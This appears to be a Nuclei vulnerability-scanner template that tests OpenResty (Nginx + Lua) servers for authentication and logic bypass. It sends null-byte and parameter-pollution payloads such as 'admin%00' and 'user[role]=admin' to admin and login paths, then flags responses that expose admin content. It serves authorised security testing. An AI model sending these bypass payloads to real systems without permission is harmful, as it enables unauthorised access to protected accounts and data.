id: openresty-lua-logic-bypass-final

info:
  name: OpenResty Lua Logic/Auth Bypass
  author: Umut Ozen
  severity: high
  description: |
    ⚠️  AUTHORIZATION REQUIRED: This template attempts authentication and logic bypass attacks.
    Only use against systems where you have explicit written permission to test authentication controls.

    Detects potential logic/authentication bypass vulnerabilities in OpenResty (Nginx + Lua)
    by comparing baseline and manipulated responses. Uses differential analysis (content-length
    delta + keyword appearance) and strict negative matching to reduce false positives.
    Note: Generates approximately 30-50 HTTP requests per target. Use with caution on production systems.
  metadata:
    max-request: 50
    verified: false
  classification:
    cwe-id: CWE-284,CWE-639
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
  tags: openresty,lua,nginx,bypass,auth,logic,advanced

flow: http(1) && http(2) && http(3)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/admin"

    attack: batteringram

    threads: 5

  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}={{bypass}}"

    payloads:
      path:
        - "/"
        - "/admin"
      param:
        - user
        - role
      bypass:
        - admin%00
        - admin%2500
        - admin[]
        - user[role]=admin

    attack: clusterbomb
    threads: 5
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"

      - type: dsl
        dsl:
          - "(len(body) - len(body_1)) > 40 || (len(body_1) - len(body)) > 40"

      - type: dsl
        dsl:
          - "contains(body, 'admin') && !contains(body_1, 'admin')"

      - type: word
        part: body
        words:
          - "admin panel"
          - "logout"
          - "dashboard"
          - "welcome admin"
          - "profile"
          - "settings"
          - "api_key"
          - "token"
        condition: or

      - type: regex
        part: body
        regex:
          - "(?i)login|sign.?in|unauthorized|forbidden|access denied"
        negative: true

  - method: POST
    path:
      - "{{BaseURL}}{{path}}"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "{{param}}={{bypass}}"

    payloads:
      path:
        - "/"
        - "/login"
      param:
        - user
        - role
      bypass:
        - admin%00
        - admin%20
        - user[]=admin

    attack: clusterbomb
    threads: 5
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "(len(body) - len(body_1)) > 40 || (len(body_1) - len(body)) > 40"
          - "contains(body, 'admin') && !contains(body_1, 'admin')"